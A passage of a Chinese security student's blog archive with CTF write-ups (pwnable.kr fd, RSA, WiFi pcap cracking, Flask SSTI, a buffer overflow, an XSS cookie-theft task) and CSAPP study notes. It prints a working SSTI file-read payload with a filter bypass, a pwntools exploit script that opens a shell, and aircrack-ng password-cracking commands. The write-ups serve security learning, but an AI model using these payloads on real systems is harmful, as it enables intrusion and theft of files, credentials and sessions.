（键盘上在1的左边）括起来。","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://hanqd.github.io/tags/pwn/"}]},{"title":"pwnable.kr-fd","slug":"pwnable-fd","date":"2019-05-18T15:01:34.120Z","updated":"2019-05-18T15:06:18.163Z","comments":true,"path":"2019/05/18/pwnable-fd/","link":"","permalink":"https://hanqd.github.io/2019/05/18/pwnable-fd/","excerpt":"pwn-fd被论文支配了n天后，抓紧开始新的学习。这道题目是来自pwn题目练习，知识点：Linux文件描述符、SSH远程登录。","text":"pwn-fd被论文支配了n天后，抓紧开始新的学习。这道题目是来自pwn题目练习，知识点：Linux文件描述符、SSH远程登录。 题目描述题目中提到Linux文件描述符，还有一行命令ssh fd@pwnable.kr -p2222 (pw:guest)。 知识准备 Linux文件描述符 文件描述符（file descriptor），简称fd。 文件描述符 缩写 描述 0 STDIN 标准输入 1 STDOUT 标准输出 2 STDERR 标准错误输出 Linux文件描述符 SSH SSH是一种网络协议，用于计算机之间的加密登录。如果一个用户从本地计算机，使用SSH协议登录另一台远程计算机，我们就可以认为，这种登录是安全的，即时被中途截获，密码也不会泄露。基本用法：SSH主要用于远程登录，假如要以用户名user，登录远程主机host，只要输入一条简单的命令就可以了：1$ ssh user@host 如果本地用户名与远程用户名一致，登录时可以省略用户名。1$ ssh host SSH的默认端口是22，也就是说，你的登录请求会送进远程主机的22端口，使用p参数，会修改这个端口。1$ ssh -p 2222 user@host 上面这条命令表示，ssh直接连接远程主机的2222端口。SSH原理与运用-远程登录 题目分析 直接输入题目中的命令，远程登录2222端口，密码是guest。ssh fd@pwnable.kr -p2222 (pw:guest) 查看有哪些文件输入ls命令，有fd、fd.c、flag三个文件，看到有flag文件，直接cat查看试试，发现没有访问权限。 输入ls -l查看文件权限发现flag是只读的。上图结果中的各个解释 查看fd.c文件，找溢出点 1234567891011121314151617181920#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;char buf[32];int main(int argc, char* argv[], char* envp[])&#123; if(argc&lt;2)&#123; printf(\"pass argv[1] a number\\n\"); return 0; &#125; int fd = atoi( argv[1] ) - 0x1234; int len = 0; len = read(fd, buf, 32); if(!strcmp(\"LETMEWIN\\n\", buf))&#123; printf(\"good job :)\\n\"); system(\"/bin/cat flag\"); exit(0); &#125; printf(\"learn about Linux file IO\\n\"); return 0;&#125; 重点函数read(),这里的意思是把参数fd所指的文件中的32个字节传送到buf指针所指的内存中，若参数count为0，就是这里32变为0，则read()就不会有作用并返回0，返回值为实际读取到的字节数。 这里的atoi函数是把argv[1]的数据类型转换为int型，用man atoi查看这里使fd=0就会在键盘上输入LETMEWIN，就可以获得flag。让atoi( argv[1] )=0x1234，十进制为4660 查看fd文件类型，是ELF 32位文件运行fd，输入4660，可以在键盘键入数据，进入程序后输入LETMEWIN，得到flag","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://hanqd.github.io/tags/pwn/"}]},{"title":"CSAPP笔记-第二章 信息的表示和处理","slug":"CSAPP第二章","date":"2019-05-10T13:40:06.151Z","updated":"2019-05-11T14:17:55.991Z","comments":true,"path":"2019/05/10/CSAPP第二章/","link":"","permalink":"https://hanqd.github.io/2019/05/10/CSAPP第二章/","excerpt":"前言我在读书时养成的习惯，先读目录，了解文章大体结构，知道每章每节主要讲了哪些内容，把每个章节的结构理清楚，我必须得让自己的逻辑清楚，要不就觉得知识点很乱，必须理清！本科期间，在课上听老师讲完后，课下根据自己的思路理清书本后，记一遍笔记（本人喜欢动手记笔记），大部分知识点都能记住。现在，改用博客的形式记笔记，还有点不习惯，个人感觉效果不如动手记笔记好。可能每个人的学习方法不同吧。博客记笔记有个优点就是可以随意查阅，并且不害怕丢，也不占地方，有想法的时候或者自己认为有意义的内容都可以在这里记录，就像一个电子笔记本。废话说了这么多，进入正题。最近在忙毕业论文的事，抽空读点书，接下来会继续在本篇博客更新第二章的学习内容。","text":"前言我在读书时养成的习惯，先读目录，了解文章大体结构，知道每章每节主要讲了哪些内容，把每个章节的结构理清楚，我必须得让自己的逻辑清楚，要不就觉得知识点很乱，必须理清！本科期间，在课上听老师讲完后，课下根据自己的思路理清书本后，记一遍笔记（本人喜欢动手记笔记），大部分知识点都能记住。现在，改用博客的形式记笔记，还有点不习惯，个人感觉效果不如动手记笔记好。可能每个人的学习方法不同吧。博客记笔记有个优点就是可以随意查阅，并且不害怕丢，也不占地方，有想法的时候或者自己认为有意义的内容都可以在这里记录，就像一个电子笔记本。废话说了这么多，进入正题。最近在忙毕业论文的事，抽空读点书，接下来会继续在本篇博客更新第二章的学习内容。 第二章 信息的表示和处理这一章主要讲信息在计算机中的存储（通过编码的方式把不同的数据转换成机器能识别的形式），以及各种类型的数在计算机中如何运算。主要介绍三种重要的数字表示：（1）无符号编码基于传统的二进制表示法，表示大于或者等于零的数字（2）补码编码是表示有符号整数的最常见的方式，有符号整数就是可以为正或者为负的数字（3）浮点数编码是表示实数的科学计数法的以2为基数的版本 现代计算机存储和处理的信息以二值（即0和1）信号表示。二值信号能够很容易地被表示、存储和传输。二进制数字被称为“位”。通常，单个的位不是非常有用，可以用位的组合来编码文档中的字母和符号。计算机的表示法是用有限数量的位来对一个数字编码，所以，当结果太大以至于不能表示时，某些运算就会溢出。 本章结构： 信息存储（寻址、字符串与代码的表示、c语言的位级运算、逻辑运算和移位运算） 整数表示（有符号数、无符号数，补码表示） 整数运算（无符号加法、补码的加法、补码的非、无符号乘法、补码乘法、乘以常数、除以2的幂) 浮点数（浮点表示、舍入、浮点运算、C语言中的浮点数） 信息存储 大多数计算机使用字节（8个二进制位）作为最小的可寻址的内存单元，而不是访问内存中单独的位。内存的每个字节都由一个唯一的数字来标识，称它为地址。 十六进制表示法 一个字节由8位组成。二进制表示法的值域：00000000-11111111十进制表示法的值域：0-255十六进制表示法的值域：00-FF为什么用十六进制？答：二进制表示法太冗长，十进制表示法与位模式的互相转化很麻烦，所以用十六进制数来表示位模式。十六进制数字在C语言中一般以0x或者0X开头，字符‘A’-‘F’不区分大小写。 字数据大小 计算机的字长决定了系统的地址空间大小，比如对于一个字长为n位的机器而言，虚拟地址的范围是0-2^n-1，程序最多访问2^n个字节。 【疑问】：一个字长是n位，就是说系统一次可以处理的数据位数是n位，那么就又2^n个01表示方式，即有2^n个地址，那为什么说程序最多访问2^n个字节呢？？？1字节=8位，那不就是2^n*8位了吗？？？？ 20190511更继昨天的内容：今天查看了一下之前学的计算机组成原理关于这部分的内容，机器字长是指CPU一次能处理数据的位数，字长越长，数的表示范围越大，精度越高。寻址范围与存储容量有关。【例如】：计算机字长16位，其存储容量为4MB，若按字节编址的寻址范围是多少？存储容量转成位：4MB=2^22B=2^22*8b按字节寻址即一个字节为一个地址，1字节=8位，则寻址范围是：(2^22*8)/8=2^22 大多数64位机器也可以运行32位机器编译的程序，这是一种向后兼容。【举例】当程序prog.c用如下伪指令编译后Linux&gt; gcc -m32 prog.c该程序就可以在32位或64位机器上正确运行。若程序用下述伪指令编译：linux&gt; gcc -m64 prog.c那就只能在64位机器上运行。将程序称为“32位程序”或“64位程序”时，区别在于该程序是如何编译的而不是其机器运行。 寻址和字节顺序 （1）一个程序对象是多字节时，必须建立两个规则：a.这个对象的地址是什么？b.内存中如何排列这些字节？答：a.在几乎所有的机器上，多字节对象都被存储为连续的字节序列，对象的地址为所使用字节中最小的地址。【例如】假设数据类型int为32位表示，x的地址为0x100，那么x的四个字节将被存储在内存的0x100、0x101、0x102、0x103位置。b.内存中存储对象时分为小端法和大端法。（字节顺序）小端法：按照从最低有效字节到最高有效字节的顺序存储对象大端法：按照从最高有效字节到最低有效字节的顺序存储对象【例如】假设变量x的类型为int，位于地址0x100处，它的十六进制值为0x01234567。地址范围0x100-0x103的字节顺序如下：小端法：0x100：67 0x101:45 0x102:23 0x103:01大端法：0x100:01 0x101:23 0x102:45 0x103:67（2）字节顺序的重要性a.在不同类型的机器之间通过网络传送二进制数据时。字节顺序对于程序员来说是不可见的，但是在不同类型的机器之间通过网络传送二进制数据时，当小端法机器产生的数据被发送到大端法的机器或者反过来时，接收程序会发现，字里的字节成了反序的。解决办法是网络应用程序的编写必须遵守已建立的关于字节顺序的规则，发送方和接收方的机器都得将它们的内部表示转换成网络标准。b.当阅读表示整数数据的字节序列时（通常发生在检查机器级程序时）【举例】给出了一个机器级代码的文本表示4004d3: 01 05 43 0b 20 00 add %eax,0x200b43(%rip)意思是：十六进制字节串 01 05 43 0b 20 00 是一条指令的字节级表示，这条指令是进行加法运算，把一个字长的数据加到一个值上，该值的存储地址由0x200b43加上当前PC的值得到。如果取出这个序列的最后四个字节：43 0b 20 00，并且将其反序，得到00 20 0b 43，去掉开头的0，得到值0x200b43，这就是右边的值。当阅读像此类小端法机器生成的机器级程序表示时，经常会将字节按照相反的顺序显示。c.当编写规避正常的类型系统的程序时C语言中可以通过使用强制类型转换或联合来允许以一种数据类型引用一个对象，而这种数据类型与创建这个对象时定义的数据类型不同。在不同的系统上，除了字节顺序不同外，数值的结果是一样的。 表示字符串 C语言中字符串被编码为一个以null（值为0）字符结尾的字符数组。每个字符都由某个标准编码来表示，最常见的是ASCII字符码。 表示代码 同一个C函数在不同机器上编译时，生成的机器代码都是不一样的。【举例】123int sum(int x,int y)&#123; return x+y&#125; 生成的机器码:Linux 32:55 89 e5 8b 45 0c 03 45 08 c9 c3Windows: 55 89 e5 8b 45 0c 03 45 08 5d c3Linux 64:55 48 89 e5 89 7d fc 89 75 f8 03 45 fc c9 c3说明不同的机器类型使用不同的且不兼容的指令和编码方式。即时是完全一样的进程，运行在不同的操作系统上也会有不同的编码规则，因此，二进制代码是不兼容的。","categories":[],"tags":[{"name":"CSAPP笔记","slug":"CSAPP笔记","permalink":"https://hanqd.github.io/tags/CSAPP笔记/"}]},{"title":"CSAPP笔记-第一章 计算机系统漫游","slug":"20190505","date":"2019-05-05T13:40:05.753Z","updated":"2019-05-09T14:26:47.135Z","comments":true,"path":"2019/05/05/20190505/","link":"","permalink":"https://hanqd.github.io/2019/05/05/20190505/","excerpt":"第一章 计算机系统漫游这一章通过研究“hello world”这一简单程序的生命周期，介绍了计算机系统的主要概念和主题，先从概念或名词的上理解计算机系统。这一章先概括地介绍了一下计算机系统的硬件和软件，剩余章节会详细的介绍，让我们有一个大体了解与框架。 运行一个简单的程序所做工作（Hello程序的生命周期） 系统硬件 存储设备 操作系统（应用软件与系统硬件的桥梁） 系统之间的通信 重要概念","text":"第一章 计算机系统漫游这一章通过研究“hello world”这一简单程序的生命周期，介绍了计算机系统的主要概念和主题，先从概念或名词的上理解计算机系统。这一章先概括地介绍了一下计算机系统的硬件和软件，剩余章节会详细的介绍，让我们有一个大体了解与框架。 运行一个简单的程序所做工作（Hello程序的生命周期） 系统硬件 存储设备 操作系统（应用软件与系统硬件的桥梁） 系统之间的通信 重要概念 Hello程序的生命周期 源程序 即程序员通过编辑器创建并保存的文本文件，文件名是hello.c 源程序实际上就是一个由值0和1组成的位（又称比特）序列，8位是1字节，每个字节表示程序中的某些文本字符 hello.c程序是以字节序列的方式存储在文件中的 像hello.c这样只由ASCII字符构成的文件称为文本文件，其他所有文件都称为二进制文件 hello.c的表示方法说明了一个思想：系统中的所有信息——包括磁盘文件，内存中的程序，内存中存放的用户数据以及网络上传递的数据，都由一串比特表示。区分不同数据对象的唯一方法是我们读到这些数据对象时的上下文。 源程序——&gt;可执行目标程序（源文件——&gt;目标文件）程序被其他程序翻译成不同的格式由编译器驱动程序（编译系统）：高级语言——&gt;低级机器语言指令在Linux中编译指令是：gcc -o hello hello.cGCC编译器驱动程序读取源程序文件hello.c，并把它翻译成一个可执行目标文件hello。这个翻译过程可分为四个阶段完成。执行这四个阶段的程序（预处理器、编译器、汇编器和链接器）一起构成了编译系统。 预处理阶段：hello.c——&gt;hello.i 编译阶段：hello.i——&gt;hello.s 他包含一个汇编语言程序 汇编阶段：hello.s——&gt;hello.o（目标文件：二进制文件） 链接阶段：得到hello文件：可执行目标文件，可以被加载到内存中，由系统执行 了解编译系统如何工作是大有益处的： 优化程序性能 理解链接时出现的错误 避免安全漏洞 运行hello文件要想在Linux系统上运行该可执行文件，我们将他的文件名输入到称为shell的应用程序中：./helloshell是一个命令行解释器，它输出一个提示符，等待输入一个命令行，然后执行这个命令。运行hello文件，shell程序分两种情况：a. 经过处理器再到内存b. 不经过处理器，利用直接存储器（DMA）技术，直接从磁盘到达主存，一旦目标文件hello中的代码和数据被加载到主存，处理器就开始执行hello程序的main程序中的机器语言指令，这些指令将“hello world\\n”字符串中的字节从主存复制到寄存器文件，再从寄存器文件中复制到显示设备，最终显示在屏幕上。 系统的硬件组成 总线：携带信息字节并负责在各个部门间传递 I/O设备：系统与外界的联系通道，一般包括键盘、鼠标、显示器和磁盘 主存：一个临时存储设备，在处理器执行程序时，用来存放程序和程序处理的数据 处理器（CPU）：解释（或执行）存储在主存中指令的引擎CPU在指令的要求下可能会执行的操作： 加载：从主存复制一个字节或一个字到寄存器，以覆盖寄存器原来的内容 存储：从寄存器复制一个字节或者一个字到主存的某个位置，以覆盖这个位置上原来的内容 操作：把两个寄存器的内容复制到ALU，ALU对这两个字做算术运算，并将结果存放到一个寄存器中，以覆盖该寄存器中原来的内容 跳转：从指令本身中抽取一个字，并将这个字复制到程序计数器（PC）中，以覆盖PC中原来的值 存储设备形成层次结构在处理器和一个较大较慢的设备（如主存）之间插入一个更小更快的存储设备（如高速缓存）的想法已经成为一个普遍的观念。每个计算机系统中的存储设备都被组织成一个存储器层次结构。 L0 CPU寄存器：保存来自高速缓存存储器的字L1-L3 高速缓存（SRAM）：L1高速缓存保存取自L2高速缓存的高速缓存行，L2保存L3，L3保存来自主存的高速缓存行L4 主存（DRAM）：保存取自本地磁盘的磁盘块L5 本地二级存储（本地磁盘）：保存取自远程服务器上磁盘的文件L6 远程二级存储（分布式文件系统，Web服务器） 从L0-L6，设备的访问速度越来越慢，容量越来越大，并且每字节的造价也越来越便宜。 操作系统管理硬件运行程序时，程序没有直接访问键盘、显示器、磁盘或者主存，而是依靠操作系统提供的服务，也就是说，操作系统是应用程序和硬件之间的一层软件，所有应用程序对硬件的操作尝试都必须通过操作系统。 操作系统的功能：（1）防止硬件被失控的应用程序滥用；（2）向应用程序提供简单一致机制来控制复杂而又通常不相同的低级硬件设备操作系统通过几个基本的抽象概念（进程、虚拟内存和文件）来实现这两个功能。 文件是对I/O设备的抽象 虚拟内存是对主存和磁盘I/O设备的抽象 进程则是对处理器、主存和I/O设备的抽象 进程在一个系统上可以同时运行多个进程，而每个进程都好像在独占的使用处理器、主存和I/O设备。并发运行：一个进程的指令和另一个进程的指令是交错执行的。上下文：操作系统保持跟踪进程运行所需的所有状态信息，比如PC和寄存器文件的当前值，以及主存内容。上下文切换：操作系统把控制权从当前进程转移到某个新进程，即保存当前进程的上下文，恢复新进程的上下文，将控制权传递到新进程。从一个进程到另一个进程的转换是由操作系统内核（kernel）管理的。内核是操作系统代码常驻主存的部分。 线程一个进程实际上可以由多个线程组成。线程易共享数据，运行速度快。 虚拟内存虚拟内存是一个抽象概念，即每个进程好像都在独占地使用主存。 文件文件就是字节序列。每个I/O设备，包括磁盘、键盘、显示器甚至网络都可以看成文件。系统之间通过网络通信系统可以通过网络和其他系统连接到一起。当系统从主存复制一串字节到网络适配器时，数据流经过网络到达另一台机器，相似的，系统可以读取从其他机器发送来的数据，并把数据复制到自己的主存。客户端和服务器之间交互的类型在所有的网络应用中是非常典型的。重要概念 Amdahl定律该定律的主要思想是，当我们对系统的某个部分加速时，其对系统整体性能的影响取决于该部分的重要性和加速程度。【计算】若系统执行某应用程序需要时间为T1，假设系统某部分（该应用程序的某个部分）所需执行时间与该时间的比例是a，而该部分性能提升比例为k。该部分初始所需时间为：a*T1现在所需时间为：(a*T1)/k该应用程序的总的执行时间为：T2=（1-a）*T1+(a*T1)/k=T1[(1-a)+a/k]加速比：S=T1/T2=1/((1-a)+a/k) 要想显著加速整个系统，必须提升全系统中相当大的部分的速度。 并行和并发并行：指一个同时具有多个活动的系统。并行：用并发来使一个系统运行的更快。（1）线性级并发同时有多个程序执行的系统，就是并发。使用线程，能够在一个进程中执行多个控制流。（2）指令级并行处理器可以同时执行多条指令的属性称为指令级并行。（3）单指令、多数据许多现代处理器拥有特殊的硬件，允许一条指令产生多个可以并行执行的操作，这种方式称为单指令、多数据。3.抽象","categories":[],"tags":[{"name":"CSAPP笔记","slug":"CSAPP笔记","permalink":"https://hanqd.github.io/tags/CSAPP笔记/"}]},{"title":"Crypto RSA","slug":"RSA","date":"2019-04-29T14:49:12.932Z","updated":"2019-04-29T14:59:35.439Z","comments":true,"path":"2019/04/29/RSA/","link":"","permalink":"https://hanqd.github.io/2019/04/29/RSA/","excerpt":"What’s RSA?知识准备","text":"What’s RSA?知识准备 RSA算法： https://www.anquanke.com/post/id/87105 CTF中常用的RSA解题：https://www.k2zone.cn/?p=2157题目描述题目给了两个文件，其中一个是后缀为.pem的RSA私钥文件，另一个是被加密的flag文件题目分析这是一道RSA入门题目，直接给出了私钥和加密文件。 有了私钥，直接解密文件即可，使用openssl工具（在Ubuntu里安装sudo apt-get install openssl即可）进行解密。命令：openssl rsautl -decrypt -in flag.encrypt -inkey rsa_private_key.pem -out flag.txt意思是在flag.encrypt文件中用rsa_private_key.pem解密，生成flag.txt解密后的文件。 打开flag.txt即可找到flag。 RSA2题目描述题目给了后缀名为.pem的公钥文件和加密文件flag.encrypt 题目分析这道题目有两种解题思路：flag文件是被私钥加密，需要用公钥解密；另一个是flag文件是被公钥加密，需要用私钥解密。使用上个题目中的命令，使用公钥解密，不对，所以这道题目应该是使用私钥加密的。 现在有了公钥，如何得到私钥？使用公钥得到n，知道n后分解得到p和q，再根据RSA算法解出d,得到私钥即可。公钥（e,n）,私钥（d,n）。 使用命令：openssl rsa -pubin -text -modulus -in pubkey.pem得到modulus即为n（十六进制）转成十进制得到n:87924348264132406875276140514499937145050893665602592992418171647042491658461 用yafu工具（下载Windows版https://sourceforge.net/projects/yafu/ ，运行x64位的程序）分解n,得到p和q 用RSA-tool解出dd:2DB139DC7B9747A32312240AA11D7E8AA554BFA0BD5B981C0903667936609179E98FB1AA54141(十六进制)d:93076836824908620642628594590464850812511038475673825979968428923835223225430811644363358529 有了d和n,生成私钥需要下载pycrypto库，安装出错：","categories":[],"tags":[{"name":"RSA","slug":"RSA","permalink":"https://hanqd.github.io/tags/RSA/"}]},{"title":"Misc Realwifi","slug":"misc realwifi","date":"2019-04-28T13:55:05.433Z","updated":"2019-04-28T14:34:53.101Z","comments":true,"path":"2019/04/28/misc realwifi/","link":"","permalink":"https://hanqd.github.io/2019/04/28/misc realwifi/","excerpt":"Realwifi题目描述","text":"Realwifi题目描述 下载文件，查看文件类型是一个抓到的数据文件，用wireshark软件打开此文件，发现协议是802.11协议，搜了一下此协议，Wifi以802.11做为其网络层以下的协议。 知识准备 这个是比较全且比较详细的关于802.11协议的介绍：http://www.sohu.com/a/242052940_468740 无线密码破解的writeup：https://www.freebuf.com/column/153197.html 所用工具：aircrack-ng 安装：sudo apt-get install aircrack-ng 操作环境：Ubuntu题目分析 在ctf中遇到802.11协议题目，大多用aricrack-ng工具，查看ESSID和加密类型，使用命令aircrack-ng realwifi.pcap 用弱口令字典暴力破解WiFi密码，使用命令aircrack-ng -w rkolin.txt realwifi.pcap这个弱口令字典在网上可以下载。得到WiFi密码为12345678 利用ESSID和WiFi密码，解密原来的realWiFi文件，得到解密后的新的文件，使用命令：airdecap-ng -e Blue-Whale -p 12345678 realwifi.pcap 用wireshark工具打开新文件追踪tcp流，可看到flag 得到flag","categories":[],"tags":[{"name":"Misc","slug":"Misc","permalink":"https://hanqd.github.io/tags/Misc/"},{"name":"802.11协议","slug":"802-11协议","permalink":"https://hanqd.github.io/tags/802-11协议/"}]},{"title":"恶意软件样本地址集合","slug":"20190427","date":"2019-04-27T11:47:10.943Z","updated":"2019-04-27T11:48:19.388Z","comments":true,"path":"2019/04/27/20190427/","link":"","permalink":"https://hanqd.github.io/2019/04/27/20190427/","excerpt":"近几天所做近几天一直在写毕业论文，大致是用一个插件去识别恶意软件中的加密算法。","text":"近几天所做近几天一直在写毕业论文，大致是用一个插件去识别恶意软件中的加密算法。今天在找恶意软件样本，想着用这个工具测试一下，可是在下载恶意软件样本这给卡住了，访问的网站总是蹦，而且有的还找不到注册界面。。。。。 ###对自己的期望论文写的差不多了，对于毕业是没问题了，但是对于导师给的要求还没完成，就是对这个插件进行开发，无奈自己技术有限，现在正在学习探索中，希望能如期完成老师给的任务。 下面是我找到的恶意软件样本下载地址：https://zhuanlan.zhihu.com/p/23000035","categories":[],"tags":[{"name":"恶意软件样本","slug":"恶意软件样本","permalink":"https://hanqd.github.io/tags/恶意软件样本/"}]},{"title":"oj Web-Confusion1(SSTI攻击)","slug":"oj web confusion1","date":"2019-04-21T13:29:12.901Z","updated":"2019-04-21T13:49:41.949Z","comments":true,"path":"2019/04/21/oj web confusion1/","link":"","permalink":"https://hanqd.github.io/2019/04/21/oj web confusion1/","excerpt":"Confusion1题目描述打开网址，就给了一个图片，看这个图片好像是个蛇缠着一个大象（貌似是这样）。","text":"Confusion1题目描述打开网址，就给了一个图片，看这个图片好像是个蛇缠着一个大象（貌似是这样）。网页上还有两个按钮，登录和注册，点进去都是404. 题目分析 根据题目提示，寻找用户输入，理解图片，点了所有能点的，也没发现用户输入点在哪，图片就是一个蛇缠着一个大象，话说多大的蛇能缠住大象啊！那就是蟒蛇（Python）。那这道题目与Python有关？？？ 把点进去的网页的源代码全看了，在两个404中发现了flag所在！！！网页代码如下： 12345678910&lt;!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;404 Not Found&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Not Found&lt;/h1&gt;&lt;p&gt;The requested URL /login.php was not found on this server.&lt;/p&gt;&lt;hr&gt;&lt;address&gt;Apache/2.4.10 (Debian) Server at 123.207.149.64 Port 23361&lt;/address&gt;&lt;/body&gt;&lt;/html&gt;&lt;!-- Flag @ /opt/flag_1234qwerty.txt --&gt; 看了网上的wp，知道这是一个SSTI类型的题目404页面 + Python 很容易就联想到 Flask jinja injection(SSTI) 这里是另一种注入，对于新手来说，又增加了知识点，不能仅限于解题，得把原理及题目思路搞懂才行。 读flag文件命令：&amp;#123;&amp;#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;/opt/flag_1234qwerty.txt&#39;).read()&amp;#125;&amp;#125;，（注：’&#123;’表示左大括号，’&#125;’是右大括号，hexo在部署博客时，遇到大括号会出错。）出现如下，考虑是把class、mro、subclasses、read给过滤了。多次测试，确实过滤了以上字符 用request.args进行绕过，让上边那四个当成参数返回。request.args是flask中的一个属性,为返回请求的参数。以上命令改为：&amp;#123;&amp;#123;&#39;&#39;[request.args.a][request.args.b][2][request.args.c]()[40](&#39;/opt/flag_1234qwerty.txt&#39;)[request.args.d]()&amp;#125;&amp;#125;?a=__class__&amp;b=__mro__&amp;c=__subclasses__&amp;d=read 最后在404界面得到flag。 所用知识 附writeup博客：https://www.xctf.org.cn/library/details/8723e039db0164e2f7345a12d2edd2a5e800adf7/ SSTI：https://hellohxk.com/blog/ssti/ +https://xz.aliyun.com/t/3679 (这个很详细，易懂)。模板引擎：就是写好的代码模板，然后把数据填到模板里，经过浏览器渲染（理解成合成好理解），生成html页面返回给浏览器。优点是能够代码重用。这里就用了模板，把数据塞到模板里。服务器端模板注入：在&#123;&#123;&#125;&#125;里，他将我们的代码进行了执行。服务器将我们的数据经过引擎解析的时候，进行了执行，模板注入与sql注入成因有点相似，都是信任了用户的输入，将不可靠的用户输入不经过滤直接进行了执行，用户插入了恶意代码同样也会执行。 模板注入时：实行文件读写和命令执行的基本操作：获取基本类-&gt;获取基本类的子类-&gt;在子类中找到关于命令执行和文件读写的模块。 python的几个函数解析 _class_ 返回调用的参数类型_bases__ 返回类型列表__mro_ 此属性是在方法解析期间寻找基类时考虑的类元组_subclasses_() 返回object的子类_globals_ 函数会以字典类型返回当前位置的全部全局变量 与 func_globals 等价 获取基本类(object)： ‘’._class_._mro__[2]{}.__class_._bases__[0]().__class_._bases__[0][].__class_._bases__[0]request.__class_.__mro__[9] //在flask的jinja2模块渲染时可用 获取基本类的子类： object._subclasses__()//‘’.__class_._mro_[2]._subclasses_() 快速查找该引用对应的位置：&#39;&#39;.__class__.__mro__[2].__subclasses__().index(file) 比如file在的位置为40，则读文件：&#39;&#39;.__class__.__mro__[2].__subclasses__()[40]","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://hanqd.github.io/tags/web/"},{"name":"SSTI","slug":"SSTI","permalink":"https://hanqd.github.io/tags/SSTI/"}]},{"title":"oj pwn-bof","slug":"oj pwn bof","date":"2019-04-19T12:48:55.890Z","updated":"2019-04-19T12:50:02.611Z","comments":true,"path":"2019/04/19/oj pwn bof/","link":"","permalink":"https://hanqd.github.io/2019/04/19/oj pwn bof/","excerpt":"bof之前做过这道题，但是没做出来，对于pwn类型的题目还不太熟悉，现在对pwn题有了新的认识和知识，再重新解一下这道题目。","text":"bof之前做过这道题，但是没做出来，对于pwn类型的题目还不太熟悉，现在对pwn题有了新的认识和知识，再重新解一下这道题目。 题目描述题目给了一个文件，在Ubuntu里的命令行里用file，查看一下文件类型，是ELF类型，32位。 题目分析 用IDA32位打开文件，反汇编到C代码，可见下边代码123456789ssize_t sub_8048573()&#123; char buf; // [sp+Ch] [bp-1Ch]@1 sub_804851B(); sub_804854A(); puts(\"can you pwn me?\"); return read(0, &amp;buf, 0x100u);&#125; 根据read函数和buf可以知道，产生了栈溢出。 查看保护机制开启了NX保护。 计算要覆盖的位数‘a’*0x1c+’a’*4=32 查看程序中是否有’/bin/sh’存在。 查找一下system是否存在，在ida中查找也存在 于是部署栈中的内容payload = flat([&#39;a&#39;*32,system_plt,&#39;b&#39;*4,binsh_addr])代码如下： 12345678910#!/usr/bin/env pythonfrom pwn import *#r=remote('pwn1.blue-whale.me',9990)r=process('./pwn')binsh_addr = 0x804a02c system_plt = 0x80483f0#r.recvuntil('can you pwn me?')payload = flat(['a'*32,system_plt,'b'*4,binsh_addr])r.sendline(payload)r.interactive() 在Ubuntu里输入命令 python pwn1.py,运行下写的代码，id，获得权限，至此已经成功获得shell。ls获得flag。","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://hanqd.github.io/tags/pwn/"}]},{"title":"Web babyXSS","slug":"oj XSS","date":"2019-04-17T09:27:34.347Z","updated":"2019-04-17T09:34:01.976Z","comments":true,"path":"2019/04/17/oj XSS/","link":"","permalink":"https://hanqd.github.io/2019/04/17/oj XSS/","excerpt":"BabyXSS题目描述打开题目连接，界面如下：","text":"BabyXSS题目描述打开题目连接，界面如下：看到第一句：flag在admin.php中，只有admin能得到它。，点击admin.php进入admin界面第二句：你可以向admin发送消息，求他给你flag，但他不会鸟你。哈哈哈哈下边有两个输入框，随便在里边输点内容，结果如下图：Proof of work失败。 知识准备 XSS：https://ctf-wiki.github.io/ctf-wiki/web/xss/ ，内容很详细，XSS简介+XSS类型+XSS利用 （此题为Cookies窃取） Proof of workPoW——工作量证明 ：https://www.jianshu.com/p/2aea9cdc825a 安装Proofofwork ：https://github.com/kmyk/libproofofwork命令pip install Proofofwork，我用的是Python2.7版本，pip安装时报错： DEPRECATION: Python 2.7 will reach the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 won’t be maintained after that date. A future version of pip will drop support for Python 2.7. 弃用：Python 2.7将于2020年1月1日到期。请升级您的Python，因为在该日期之后将不再维护Python 2.7。 未来的pip版本将放弃对Python 2.7的支持。今天pip时报出这个信息，python2也快走到头了，且行且珍惜。 于是安装了Python3版本，安装还是出错。Command &quot;D:\\python3\\python.exe -u -c &quot;import setuptools, tokenize;__file__=&#39;C:\\\\Users\\\\Administrator\\\\AppData\\\\Local\\\\Temp\\\\pycharm-packaging\\\\proofofwork\\\\setup.py&#39;;f=getattr(tokenize, &#39;open&#39;, open)(__file__);code=f.read().replace(&#39;\\r\\n&#39;, &#39;\\n&#39;);f.close()尝试解决这个错误，试了好几个方法后，无果，果断换Linux系统安装。还是出现同样错误。 直接下载安装包，还是不行，放弃这个方法。 题目分析 substr(md5(‘’),0,6) === ‘7502a1’substr（）函数是截取字符串，这里的字符串是用md5加密后的，取加密后字符串的前6个字符，使它强等于‘7502a1’。 用md5加密字符串 https://blog.csdn.net/t8116189520/article/details/78928334itertools模块用法：http://outofmemory.cn/code-snippet/2390/python-itertools-module-learn-notestartswith函数用法：https://blog.csdn.net/doiido/article/details/43280657Python代码为： 12345678910111213from itertools import countimport hashlibdef md5(str1): m = hashlib.md5(str1.encode(encoding='utf8')) return m.hexdigest()#从1开始循环，默认每次加1，直到与示例字符串相等，退出循环for i in count(1): s=md5(str(i)) if s.startswith('c3301d'): print(i) break 把得到的字符串，输入md5框中，结果如下说明输入的字符串是正确的。 在XSS平台上创建自己的项目，选择默认模板，根据下边的代码，选择代码在mesage框中输入，再输上MD5，步骤2中得到的字符串，提交，在xss平台的项目内容中，可以看到得到的信息，打开后有cookie，cookie里的token是admin的。 拿到admin的cookie之后，就可以假冒admin拿到flag。在burpsuite软件中抓包，抓包详细操作之前已经学过，这里不再赘述（在https://hanqd.github.io/2019/04/11/20190411/） 